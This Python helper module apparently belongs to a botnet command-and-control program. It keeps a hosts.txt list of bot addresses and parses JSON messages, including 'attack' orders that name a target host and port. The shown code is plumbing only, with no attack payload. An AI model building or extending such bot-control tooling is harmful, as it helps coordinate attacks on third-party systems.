from bot import Bot
import json
from enum import Enum

FILE_LOCAL = "hosts.txt"
SEND_INFO = 'send_info'
ATTACK = 'attack'
COMMAND = 'command'
DATA = 'data'
TARGET = 'target'
PORT = 'port'

def dictionary_to_json(data):
    return json.dumps(data)

def save_text_to_file(text):
    try:
        existing_bots = load_bot(FILE_LOCAL)
        for existing_bot in existing_bots:
            if existing_bot.host == text.split(':')[0]:
                existing_bots.remove(existing_bot)
                break

        existing_bots.append(Bot(*text.split(':')))
        with open(FILE_LOCAL, "w") as file:
            for bot in existing_bots:
                file.write(f"{bot.host}:{bot.port}\n")
        print("Text saved to", FILE_LOCAL)
    except IOError:
        print("Error: Unable to write to file", FILE_LOCAL)


def parse_socket_info(socket_info_str):
       substrings = socket_info_str.strip().split(':')
       return substrings[0],int(substrings[1])

def parse_command(command):
    received_dict = json.loads(command)
    return received_dict[COMMAND], received_dict[DATA]

def parse_attack(command):
    received_dict = json.loads(command)
    return received_dict[TARGET], received_dict[PORT]

def load_bot(file_path):
    bots = []
    try:
        with open(file_path, "r") as file:
            for line in file:
                substrings = line.strip().split(':')
                bot = Bot(substrings[0],int(substrings[1]))
                bots.append(bot)
    except FileNotFoundError:
        print("Error: File not found -", file_path)
    except IOError:
        print("Error: Unable to read file -", file_path)
    return bots